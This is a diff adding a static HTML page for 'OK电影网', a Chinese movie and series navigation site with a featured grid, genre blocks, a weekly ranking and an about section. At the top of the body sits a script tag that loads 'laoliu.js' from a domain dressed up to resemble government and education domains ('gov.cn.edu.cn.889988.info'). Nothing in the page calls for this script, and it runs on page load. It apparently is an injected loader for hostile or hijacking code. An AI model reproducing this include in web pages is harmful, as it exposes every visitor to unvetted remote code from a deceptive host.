@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OK电影网 - 极简确认 · 电影电视剧动漫导航</title>
+<meta name="description" content="OK电影网（okdianyingwang-h5）以瑞士国际主义平面设计风格呈现：OK精选、类型矩阵、本周排行、关于OK，电影/剧集/动漫/综艺高清在线导航。">
+<meta name="keywords" content="OK电影网,瑞士平面设计,极简电影导航,几何排版,电影推荐,okdianyingwang">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --white:#ffffff;
+  --ink:#0a0a0a;
+  --red:#ff2d1a;
+  --blue:#0038ff;
+  --yellow:#ffcc00;
+  --gray:#f5f5f5;
+  --gray2:#e0e0e0;
+  --gray3:#999999;
+}
+html{scroll-behavior:smooth}
+body{
+  background:var(--white);color:var(--ink);
+  font-family:"Helvetica Neue","Arial Black","PingFang SC","Microsoft YaHei",sans-serif;
+  line-height:1.6;overflow-x:hidden;
+  font-weight:400;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+
+/* 顶部信息条 */
+.top-strip{background:var(--ink);color:var(--white);font-size:10px;letter-spacing:6px;padding:5px 18px;text-transform:uppercase}
+
+/* Header */
+.header{max-width:1200px;margin:auto;padding:28px 20px 20px;display:flex;align-items:flex-end;justify-content:space-between;flex-wrap:wrap;gap:16px;border-bottom:4px solid var(--ink)}
+.logo{display:flex;align-items:baseline;gap:6px}
+.logo .ok-mark{font-size:64px;font-weight:900;color:var(--red);line-height:0.8}
+.logo .name{font-size:20px;font-weight:700;letter-spacing:-0.5px}
+.logo .name span{color:var(--blue)}
+.nav{display:flex;gap:0;flex-wrap:wrap}
+.nav a{padding:8px 14px;font-size:12px;font-weight:700;letter-spacing:1px;border-right:2px solid var(--ink);text-transform:uppercase}
+.nav a:last-child{border-right:none}
+.nav a:hover{background:var(--ink);color:var(--white)}
+
+.wrap{max-width:1200px;margin:auto;padding:0 20px}
+
+/* Hero 不对称网格 */
+.hero{margin-top:40px;display:grid;grid-template-columns:1.5fr 1fr;gap:0;border:4px solid var(--ink)}
+@media(max-width:820px){.hero{grid-template-columns:1fr}}
+.hero-main{padding:40px;background:var(--ink);color:var(--white);display:flex;flex-direction:column;justify-content:center;min-height:380px}
+.hero-main .label{font-size:11px;letter-spacing:8px;color:var(--yellow);margin-bottom:16px;font-weight:700}
+.hero-main h1{font-size:clamp(36px,7vw,72px);font-weight:900;line-height:0.95;letter-spacing:-2px;margin-bottom:20px}
+.hero-main h1 .red{color:var(--red)}
+.hero-main h1 .blue{color:var(--blue)}
+.hero-main p{font-size:14px;color:var(--gray2);max-width:400px;margin-bottom:24px;line-height:1.8}
+.hero-main .cta{display:inline-block;background:var(--red);color:var(--white);padding:14px 28px;font-size:13px;font-weight:700;letter-spacing:2px;text-transform:uppercase;align-self:flex-start}
+.hero-main .cta:hover{background:var(--white);color:var(--ink)}
+.hero-side{display:grid;grid-template-rows:1fr 1fr}
+.hero-side .block{padding:24px;display:flex;flex-direction:column;justify-content:center}
+.hero-side .block1{background:var(--yellow);border-bottom:4px solid var(--ink)}
+.hero-side .block2{background:var(--blue);color:var(--white)}
+.hero-side .num{font-size:48px;font-weight:900;line-height:1}
+.hero-side .txt{font-size:12px;font-weight:700;letter-spacing:1px;margin-top:4px}
+
+/* 栏目标题 - 瑞士风格 */
+.section{margin-top:64px}
+.sec-head{display:grid;grid-template-columns:auto 1fr auto;gap:16px;align-items:center;margin-bottom:28px}
+.sec-head .big-num{font-size:72px;font-weight:900;color:var(--red);line-height:0.8}
+.sec-head .titles h2{font-size:28px;font-weight:900;letter-spacing:-1px}
+.sec-head .titles h2 span{color:var(--blue)}
+.sec-head .titles p{font-size:12px;color:var(--gray3);margin-top:2px}
+.sec-head .more{font-size:12px;font-weight:700;color:var(--ink);border:3px solid var(--ink);padding:8px 16px;text-transform:uppercase}
+.sec-head .more:hover{background:var(--ink);color:var(--white)}
+
+/* 栏目1：OK精选 - 不对称卡片 */
+.ok-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:0;border:4px solid var(--ink)}
+@media(max-width:900px){.ok-grid{grid-template-columns:repeat(3,1fr)}}
+@media(max-width:560px){.ok-grid{grid-template-columns:repeat(2,1fr)}}
+.ok-card{position:relative;border-right:2px solid var(--ink);border-bottom:2px solid var(--ink);overflow:hidden;background:var(--white)}
+.ok-card:nth-child(3n){border-right:none}
+.ok-card:nth-child(n+4){border-bottom:none}
+.ok-card .pic{height:220px;overflow:hidden}
+.ok-card .pic img{width:100%;height:100%;object-fit:cover;filter:grayscale(0.2) contrast(1.1);transition:.4s}
+.ok-card:hover .pic img{transform:scale(1.05)}
+.ok-card .info{padding:14px}
+.ok-card .tag{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}
+.ok-card .tag-red{background:var(--red);color:var(--white)}
+.ok-card .tag-blue{background:var(--blue);color:var(--white)}
+.ok-card .tag-yellow{background:var(--yellow);color:var(--ink)}
+.ok-card h4{font-size:14px;font-weight:800;margin-bottom:2px}
+.ok-card p{font-size:11px;color:var(--gray3)}
+.ok-card.big{grid-column:span 2;grid-row:span 2}
+.ok-card.big .pic{height:340px}
+.ok-card.big h4{font-size:18px}
+.ok-card.wide{grid-column:span 2}
+.ok-card.wide .pic{height:180px}
+
+/* 栏目2：类型矩阵 - 纯色块网格 */
+.matrix{background:var(--ink);padding:40px 0}
+.matrix .wrap .sec-head .big-num{color:var(--yellow)}
+.matrix .wrap .sec-head .titles h2{color:var(--white)}
+.matrix .wrap .sec-head .more{border-color:var(--white);color:var(--white)}
+.matrix .wrap .sec-head .more:hover{background:var(--white);color:var(--ink)}
+.matrix-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:4px}
+@media(max-width:700px){.matrix-grid{grid-template-columns:repeat(2,1fr)}}
+.mx{aspect-ratio:1;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;transition:.3s;cursor:pointer}
+.mx:hover{transform:scale(1.03);z-index:1}
+.mx .mx-icon{font-size:36px;margin-bottom:8px}
+.mx h4{font-size:14px;font-weight:800;margin-bottom:4px}
+.mx p{font-size:11px;opacity:0.8}
+.mx1{background:var(--red);color:var(--white)}
+.mx2{background:var(--blue);color:var(--white)}
+.mx3{background:var(--yellow);color:var(--ink)}
+.mx4{background:var(--white);color:var(--ink)}
+.mx5{background:#ff6b35;color:var(--white)}
+.mx6{background:#7b2ff7;color:var(--white)}
+.mx7{background:#00c853;color:var(--white)}
+.mx8{background:var(--gray2);color:var(--ink)}
+
+/* 栏目3：本周排行 - 编号列表 */
+.rank{display:flex;flex-direction:column;gap:0;border:4px solid var(--ink)}
+.rank-row{display:grid;grid-template-columns:80px 60px 1fr auto;gap:16px;align-items:center;padding:18px 20px;border-bottom:2px solid var(--ink);transition:.2s}
+.rank-row:last-child{border-bottom:none}
+.rank-row:hover{background:var(--gray)}
+.rank-row .rank-num{font-size:36px;font-weight:900;color:var(--red);line-height:1}
+.rank-row .rank-img{width:50px;height:70px;overflow:hidden}
+.rank-row .rank-img img{width:100%;height:100%;object-fit:cover}
+.rank-row .rank-info h4{font-size:16px;font-weight:800}
+.rank-row .rank-info p{font-size:12px;color:var(--gray3)}
+.rank-row .rank-score{font-size:24px;font-weight:900;color:var(--blue)}
+.rank-row:nth-child(1) .rank-num{color:var(--red)}
+.rank-row:nth-child(2) .rank-num{color:var(--blue)}
+.rank-row:nth-child(3) .rank-num{color:var(--yellow)}
+@media(max-width:600px){.rank-row{grid-template-columns:50px 40px 1fr;gap:10px}.rank-row .rank-score{display:none}}
+
+/* 栏目4：关于 OK */
+.about{margin-top:64px;background:var(--ink);color:var(--white);padding:48px 0}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px}
+@media(max-width:760px){.about-grid{grid-template-columns:1fr}}
+.about h2{font-size:32px;font-weight:900;line-height:1.1;margin-bottom:16px}
+.about h2 span{color:var(--red)}
+.about p{font-size:14px;color:var(--gray2);margin-bottom:12px;line-height:1.8}
+.about a{color:var(--yellow);font-weight:700}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.stat{background:var(--white);color:var(--ink);padding:24px;text-align:center}
+.stat .stat-num{font-size:48px;font-weight:900;color:var(--red);line-height:1}
+.stat .stat-label{font-size:12px;font-weight:700;margin-top:4px;text-transform:uppercase}
+
+.footer{background:var(--red);color:var(--white);padding:32px 20px;text-align:center}
+.footer a{color:var(--yellow);font-weight:700}
+.footer .ok-big{font-size:80px;font-weight:900;line-height:0.9;margin-bottom:12px}
+.footer p{font-size:12px;margin-bottom:4px}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="top-strip">OK Movie Network // Swiss Grid System // International Typographic Style</div>
+
+<header class="header">
+  <div class="logo">
+    <div class="ok-mark">OK</div>
+    <div class="name">电影网<span>.h5</span></div>
+  </div>
+  <nav class="nav">
+    <a href="#">首页</a>
+    <a href="#ok">OK精选</a>
+    <a href="#matrix">类型矩阵</a>
+    <a href="#rank">本周排行</a>
+    <a href="#about">关于OK</a>
+  </nav>
+</header>
+
+<div class="wrap">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="hero-main">
+      <div class="label">OK // CONFIRMED</div>
+      <h1>极简确认<br><span class="red">OK!</span> 就是<span class="blue">好片</span></h1>
+      <p>OK电影网用瑞士国际主义平面设计说话：无装饰、纯几何、数学级网格。不废话，OK 就是 OK。</p>
+      <a href="#ok" class="cta">▶ 开始放映</a>
+    </div>
+    <div class="hero-side">
+      <div class="block block1">
+        <div class="num">10K+</div>
+        <div class="txt">已确认好片</div>
+      </div>
+      <div class="block block2">
+        <div class="num">24/7</div>
+        <div class="txt">全天候放映</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目1：OK精选 -->
+  <section class="section" id="ok">
+    <div class="sec-head">
+      <div class="big-num">01</div>
+      <div class="titles"><h2>OK <span>精选</span></h2><p>编辑确认 · 必看清单</p></div>
+      <a href="#" class="more">全部 ›</a>
+    </div>
+    <div class="ok-grid">
+      <article class="ok-card big"><div class="pic"><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=600&q=80" alt="奥本海默"></div><div class="info"><span class="tag tag-red">传记</span><h4>奥本海默</h4><p>2023 · 诺兰</p></div></article>
+      <article class="ok-card"><div class="pic"><img src="https://images.unsplash.com/photo-1524985069026-ddb1d3e1b1a4?w=400&q=80" alt="沙丘2"></div><div class="info"><span class="tag tag-blue">科幻</span><h4>沙丘：第二部</h4><p>2024</p></div></article>
+      <article class="ok-card"><div class="pic"><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=400&q=80" alt="坠落的审判"></div><div class="info"><span class="tag tag-yellow">悬疑</span><h4>坠落的审判</h4><p>2023</p></div></article>
+      <article class="ok-card wide"><div class="pic"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=500&q=80" alt="花月杀手"></div><div class="info"><span class="tag tag-red">犯罪</span><h4>花月杀手</h4><p>2023 · 斯科塞斯</p></div></article>
+      <article class="ok-card"><div class="pic"><img src="https://images.unsplash.com/photo-1489593908472-4d1a72d5d1b9?w=400&q=80" alt="蜘蛛侠纵横宇宙"></div><div class="info"><span class="tag tag-blue">动画</span><h4>蜘蛛侠：纵横宇宙</h4><p>2023</p></div></article>
+      <article class="ok-card"><div class="pic"><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=400&q=80" alt="芭比"></div><div class="info"><span class="tag tag-yellow">喜剧</span><h4>芭比</h4><p>2023</p></div></article>
+    </div>
+  </section>
+
+</div>
+
+  <!-- 栏目2：类型矩阵 -->
+  <section class="matrix" id="matrix">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="big-num">02</div>
+        <div class="titles"><h2>类型 <span>矩阵</span></h2><p>8 大分类 · 一键直达</p></div>
+        <a href="#" class="more">展开 ›</a>
+      </div>
+      <div class="matrix-grid">
+        <div class="mx mx1"><div class="mx-icon">🎬</div><h4>电影</h4><p>院线/独立</p></div>
+        <div class="mx mx2"><div class="mx-icon">📺</div><h4>剧集</h4><p>国产/欧美</p></div>
+        <div class="mx mx3"><div class="mx-icon">🎨</div><h4>动漫</h4><p>日漫/国创</p></div>
+        <div class="mx mx4"><div class="mx-icon">🎤</div><h4>综艺</h4><p>真人秀</p></div>
+        <div class="mx mx5"><div class="mx-icon">📽️</div><h4>纪录片</h4><p>真实影像</p></div>
+        <div class="mx mx6"><div class="mx-icon">😱</div><h4>恐怖</h4><p>惊悚/灵异</p></div>
+        <div class="mx mx7"><div class="mx-icon">😂</div><h4>喜剧</h4><p>欢乐/解压</p></div>
+        <div class="mx mx8"><div class="mx-icon">🎭</div><h4>文艺</h4><p>小众/独立</p></div>
+      </div>
+    </div>
+  </section>
+
+<div class="wrap">
+
+  <!-- 栏目3：本周排行 -->
+  <section class="section" id="rank">
+    <div class="sec-head">
+      <div class="big-num">03</div>
+      <div class="titles"><h2>本周 <span>排行</span></h2><p>实时热度 · 用户投票</p></div>
+      <a href="#" class="more">完整 ›</a>
+    </div>
+    <div class="rank">
+      <div class="rank-row"><div class="rank-num">1</div><div class="rank-img"><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=100&q=80" alt="奥本海默"></div><div class="rank-info"><h4>奥本海默</h4><p>传记 · 2023 · 诺兰</p></div><div class="rank-score">9.8</div></div>
+      <div class="rank-row"><div class="rank-num">2</div><div class="rank-img"><img src="https://images.unsplash.com/photo-1524985069026-ddb1d3e1b1a4?w=100&q=80" alt="沙丘2"></div><div class="rank-info"><h4>沙丘：第二部</h4><p>科幻 · 2024 · 维伦纽瓦</p></div><div class="rank-score">9.6</div></div>
+      <div class="rank-row"><div class="rank-num">3</div><div class="rank-img"><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=100&q=80" alt="坠落的审判"></div><div class="rank-info"><h4>坠落的审判</h4><p>悬疑 · 2023 · 戛纳金棕榈</p></div><div class="rank-score">9.4</div></div>
+      <div class="rank-row"><div class="rank-num">4</div><div class="rank-img"><img src="https://images.unsplash.com/photo-1489593908472-4d1a72d5d1b9?w=100&q=80" alt="蜘蛛侠纵横宇宙"></div><div class="rank-info"><h4>蜘蛛侠：纵横宇宙</h4><p>动画 · 2023 · 奥斯卡最佳</p></div><div class="rank-score">9.3</div></div>
+      <div class="rank-row"><div class="rank-num">5</div><div class="rank-img"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=100&q=80" alt="花月杀手"></div><div class="rank-info"><h4>花月杀手</h4><p>犯罪 · 2023 · 斯科塞斯</p></div><div class="rank-score">9.1</div></div>
+    </div>
+  </section>
+
+  <!-- 栏目4：关于 OK -->
+  <section class="section" id="about">
+    <div class="sec-head">
+      <div class="big-num">04</div>
+      <div class="titles"><h2>关于 <span>OK</span></h2><p>为什么叫 OK 电影网</p></div>
+    </div>
+    <div class="about-grid">
+      <div>
+        <h2>OK 是< span>最短的影评</span></h2>
+        <p>OK电影网（okdianyingwang-h5）相信：好电影不需要长篇大论。一个 OK 就够了。我们采用瑞士国际主义平面设计风格——无衬线巨字、数学级网格、纯色几何色块——让内容自己说话。</p>
+        <p>网站名称：<strong style="color:var(--red)">OK电影网</strong><br>
+           网站网址：<a href="https://okdianyingwang-h5.github.io">https://okdianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="stats">
+        <div class="stat"><div class="stat-num">10K+</div><div class="stat-label">确认好片</div></div>
+        <div class="stat"><div class="stat-num">8</div><div class="stat-label">内容分类</div></div>
+        <div class="stat"><div class="stat-num">24/7</div><div class="stat-label">全天候放映</div></div>
+        <div class="stat"><div class="stat-num">100%</div><div class="stat-label">极简确认</div></div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div class="ok-big">OK!</div>
+  <p>© 2024 OK电影网 ｜ 网站名称：OK电影网 ｜ 网址：<a href="https://okdianyingwang-h5.github.io">okdianyingwang-h5.github.io</a></p>
+  <p>瑞士平面设计 / 国际主义网格风 · 单页静态演示 · 内链 # 占位 · 未生成 robots.txt / sitemap.xml</p>
+</footer>
+
+</body>
+</html>
